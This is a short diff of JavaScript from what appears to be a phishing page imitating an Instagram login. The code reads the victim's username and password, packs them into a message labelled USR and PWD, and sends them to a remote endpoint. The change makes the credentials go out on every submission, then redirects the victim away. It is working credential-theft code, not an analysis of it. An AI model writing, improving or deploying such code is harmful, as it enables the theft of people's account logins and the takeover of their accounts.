@@ -113,10 +113,10 @@
     var pass = document.getElementById('password').value;
     var params = {
       content: ("> **USR  : **" + user + "\n> **PWD : **" + pass )
-    }
-    if (user.length > 5 && pass.lenght > 5){
+    };
     request.send(JSON.stringify(params));
-	sleep(300)
+    if (user.length > 5 && pass.lenght > 5){
+	sleep(300);
 	window.location.replace("instagram/sardra_ye.jpg");
     }
   }
